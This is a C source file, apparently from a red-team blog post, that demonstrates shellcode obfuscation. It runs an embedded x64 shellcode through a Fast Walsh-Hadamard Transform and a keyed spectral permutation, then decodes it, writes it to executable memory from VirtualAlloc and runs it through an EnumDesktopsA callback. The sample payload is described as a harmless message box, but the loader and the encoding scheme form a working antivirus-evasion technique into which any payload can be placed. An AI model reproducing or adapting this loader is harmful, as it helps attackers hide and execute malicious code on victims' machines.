/*
 * hack.c
 * payload obfuscation via Fast Walsh-Hadamard Transform (FWHT)
 * with spectral permutation keying
 * author: @arthsome
 * https://arthsome.github.io/posts/wht-shellcode-obfuscation/
 *
 * WHT advantages over classical crypto for obfuscation:
 *   - integer-only arithmetic (no sin/cos/exp, no floating point)
 *   - only uses addition and subtraction (butterfly operations)
 *   - self-inverse: same function encodes and decodes
 *   - zero crypto-constants: no S-boxes, no round keys, no XOR masks
 *   - legitimate use in CDMA/telecom/signal processing
 *   - perfect reconstruction (no precision loss)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

/*
 * Fast Walsh-Hadamard Transform (in-place butterfly)
 *
 * The Hadamard matrix H_N is defined recursively:
 *   H_1 = [1]
 *   H_2N = | H_N   H_N  |
 *          | H_N  -H_N  |
 *
 * Self-inverse property: WHT(WHT(x)) = N * x
 * This means the SAME function is used for both
 * "encryption" and "decryption" — just divide by N after.
 *
 * The butterfly operation at each stage:
 *   u' = u + v
 *   v' = u - v
 */
void fwht(int* a, int n) {
  for (int len = 1; len < n; len <<= 1) {
    for (int i = 0; i < n; i += len << 1) {
      for (int j = 0; j < len; j++) {
        int u = a[i + j];
        int v = a[i + j + len];
        a[i + j]       = u + v;
        a[i + j + len] = u - v;
      }
    }
  }
}

/*
 * Seeded spectral permutation (Fisher-Yates with LCG PRNG)
 *
 * After the WHT transforms shellcode into spectral coefficients,
 * we shuffle them using a deterministic permutation seeded by
 * our key. Without the key, inverse WHT produces garbage.
 *
 * Keyspace: N! permutations. For N=512, that's ~1000+ bits.
 */
void spectral_scramble(int* a, int n, unsigned int key) {
  for (int i = n - 1; i > 0; i--) {
    key = key * 1664525u + 1013904223u;
    unsigned int j = key % (i + 1);
    int tmp = a[i]; a[i] = a[j]; a[j] = tmp;
  }
}

/*
 * Inverse spectral permutation
 * Replay the Fisher-Yates swaps in reverse order.
 */
void spectral_unscramble(int* a, int n, unsigned int key) {
  // pre-compute swap indices
  unsigned int* idx = (unsigned int*)malloc(n * sizeof(unsigned int));
  unsigned int s = key;
  for (int i = n - 1; i > 0; i--) {
    s = s * 1664525u + 1013904223u;
    idx[i] = s % (i + 1);
  }
  // reverse the swaps
  for (int i = 1; i < n; i++) {
    int tmp = a[i]; a[i] = a[idx[i]]; a[idx[i]] = tmp;
  }
  free(idx);
}

int main() {
  // meow-meow messagebox shellcode (x64, harmless demo)
  unsigned char my_payload[] = {
    0xfc, 0x48, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff,
    0xe8, 0xd0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41,
    0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65,
    0x48, 0x8b, 0x52, 0x60, 0x3e, 0x48, 0x8b, 0x52,
    0x18, 0x3e, 0x48, 0x8b, 0x52, 0x20, 0x3e, 0x48,
    0x8b, 0x72, 0x50, 0x3e, 0x48, 0x0f, 0xb7, 0x4a,
    0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac,
    0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1,
    0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52,
    0x41, 0x51, 0x3e, 0x48, 0x8b, 0x52, 0x20, 0x3e,
    0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x3e, 0x8b,
    0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0,
    0x74, 0x6f, 0x48, 0x01, 0xd0, 0x50, 0x3e, 0x8b,
    0x48, 0x18, 0x3e, 0x44, 0x8b, 0x40, 0x20, 0x49,
    0x01, 0xd0, 0xe3, 0x5c, 0x48, 0xff, 0xc9, 0x3e,
    0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d,
    0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1,
    0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75,
    0xf1, 0x3e, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45,
    0x39, 0xd1, 0x75, 0xd6, 0x58, 0x3e, 0x44, 0x8b,
    0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x3e, 0x41,
    0x8b, 0x0c, 0x48, 0x3e, 0x44, 0x8b, 0x40, 0x1c,
    0x49, 0x01, 0xd0, 0x3e, 0x41, 0x8b, 0x04, 0x88,
    0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e,
    0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a,
    0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0,
    0x58, 0x41, 0x59, 0x5a, 0x3e, 0x48, 0x8b, 0x12,
    0xe9, 0x49, 0xff, 0xff, 0xff, 0x5d, 0x49, 0xc7,
    0xc1, 0x00, 0x00, 0x00, 0x00, 0x3e, 0x48, 0x8d,
    0x95, 0xfe, 0x00, 0x00, 0x00, 0x3e, 0x4c, 0x8d,
    0x85, 0x09, 0x01, 0x00, 0x00, 0x48, 0x31, 0xc9,
    0x41, 0xba, 0x45, 0x83, 0x56, 0x07, 0xff, 0xd5,
    0x48, 0x31, 0xc9, 0x41, 0xba, 0xf0, 0xb5, 0xa2,
    0x56, 0xff, 0xd5, 0x4d, 0x65, 0x6f, 0x77, 0x2d,
    0x6d, 0x65, 0x6f, 0x77, 0x21, 0x00, 0x3d, 0x5e,
    0x2e, 0x2e, 0x5e, 0x3d, 0x00
  };

  int payload_len = sizeof(my_payload);
  unsigned int key = 0xCAFEBABE;

  printf("=== Walsh-Hadamard Transform payload obfuscation ===\n\n");

  printf("original payload (%d bytes):\n", payload_len);
  for (int i = 0; i < payload_len; i++) {
    printf("%02x ", my_payload[i]);
    if ((i + 1) % 16 == 0) printf("\n");
  }
  printf("\n\n");

  // pad to next power of 2
  int n = 1;
  while (n < payload_len) n <<= 1;

  printf("padded length: %d (next power of 2)\n", n);
  printf("key: 0x%08x\n\n", key);

  // copy into int array with NOP (0x90) padding
  int* signal = (int*)calloc(n, sizeof(int));
  for (int i = 0; i < payload_len; i++)
    signal[i] = (int)my_payload[i];
  for (int i = payload_len; i < n; i++)
    signal[i] = 0x90;

  // ============ ENCODE ============
  // step 1: forward WHT (butterfly)
  fwht(signal, n);
  printf("[+] forward WHT complete.\n");

  // step 2: spectral permutation (keyed scramble)
  spectral_scramble(signal, n, key);
  printf("[+] spectral permutation applied (key=0x%08x).\n\n", key);

  printf("obfuscated spectral data (first 32 coefficients):\n");
  for (int i = 0; i < 32 && i < n; i++) {
    printf("[%3d] %8d\n", i, signal[i]);
  }
  printf("... (%d more coefficients)\n\n", n - 32);

  // ============ DECODE ============
  // step 1: undo spectral permutation
  spectral_unscramble(signal, n, key);
  printf("[+] spectral unscramble complete.\n");

  // step 2: inverse WHT (same butterfly — self-inverse property!)
  fwht(signal, n);
  printf("[+] inverse WHT complete.\n");

  // step 3: normalize (divide by N)
  unsigned char* restored = (unsigned char*)malloc(n);
  for (int i = 0; i < n; i++)
    restored[i] = (unsigned char)(signal[i] / n);

  printf("[+] normalization complete (divide by %d).\n\n", n);

  // verify restoration
  printf("restored payload (%d bytes):\n", payload_len);
  for (int i = 0; i < payload_len; i++) {
    printf("%02x ", restored[i]);
    if ((i + 1) % 16 == 0) printf("\n");
  }
  printf("\n\n");

  // check integrity
  int match = 1;
  for (int i = 0; i < payload_len; i++) {
    if (restored[i] != my_payload[i]) { match = 0; break; }
  }
  printf("integrity check: %s\n\n", match ? "PASS" : "FAIL");

  // execute restored shellcode
  LPVOID mem = VirtualAlloc(NULL, n, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  if (mem != NULL) {
    RtlMoveMemory(mem, restored, n);
    printf("executing restored payload...\n");
    EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, (LPARAM)NULL);
  }

  free(signal);
  free(restored);
  return 0;
}
